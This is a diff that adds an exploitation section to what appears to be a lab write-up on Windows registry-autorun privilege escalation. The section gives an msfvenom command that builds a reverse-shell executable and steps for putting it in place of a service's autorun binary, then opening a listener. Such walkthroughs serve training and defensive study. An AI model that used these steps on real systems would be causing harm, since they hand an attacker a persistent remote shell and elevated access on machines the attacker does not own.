@@ -99,6 +99,26 @@ Outcome:
 
 ## Exploitation
 
+1) Use msfvenom to generate a malicious executable (exe) file that can be executed via the booting of the victim's machine:
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp lhost=eth0 lport=1234 -f exe > shell.exe
+```
+
+2) Transfer the malicious executable file to victim's machine.
+
+3) Move the malicious executable file to 'C:\Program Files\NickvourdSrv'.
+
+4) Rename the 'NCV_AMD64.exe' to 'NCV_AMD64.bak'.
+
+5) Rename the malicious exe (shell.exe) to 'NCV_AMD64.exe'.
+
+Outcome:
+
+![RegistryAutoruns-AboveActions](/Pictures/RegistryAutoruns-AboveActions.png)
+
+6) Open a listener on your Kali machine.
+
 ## Mitigation
 
 ## References
